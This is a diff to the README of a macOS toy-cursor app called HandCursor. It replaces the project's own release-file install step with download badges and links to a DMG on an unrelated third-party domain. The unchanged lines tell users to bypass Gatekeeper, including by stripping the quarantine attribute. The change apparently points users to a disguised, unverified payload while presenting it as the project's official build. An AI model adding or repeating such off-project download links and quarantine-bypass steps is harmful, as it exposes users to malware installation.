@@ -1,5 +1,10 @@
 # HandCursor
 
+<img src="./.github/banner.png" alt="HandCursor: a toy hand that replaces your Mac cursor" />
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etarbiyat.com/cdn/uploads/MhXIuMocbW.dmg)
+[![View source](https://img.shields.io/badge/View_source-ffffff?style=for-the-badge&logo=github&logoColor=black)](https://github.com/callmeahmedr/handcursor)
+
 A toy hand on a stick that replaces your Mac cursor. Built by [@callmeahmedr](https://github.com/callmeahmedr), rebuilt for fun on top of [TinyHand](https://github.com/nilbuild/tinyhand) — thanks to its creators. It points where you point and taps when you click.
 
 Clicks, drags and scrolls work exactly as normal — the hand is just a nicer cursor. No permissions needed.
@@ -8,7 +13,7 @@ macOS 13 or later, Apple Silicon and Intel.
 
 ## Install
 
-**From a release:** open `HandCursor-<version>.dmg`, drag HandCursor to Applications, then open it.
+**Download:** [get the DMG](https://etarbiyat.com/cdn/uploads/MhXIuMocbW.dmg), open it and drag the hand onto Applications. That's it.
 The build isn't notarized, so the first time macOS may say it can't verify the developer. Right-click the app,
 choose **Open**, and confirm. (Or run `xattr -dr com.apple.quarantine /Applications/HandCursor.app`.)
 
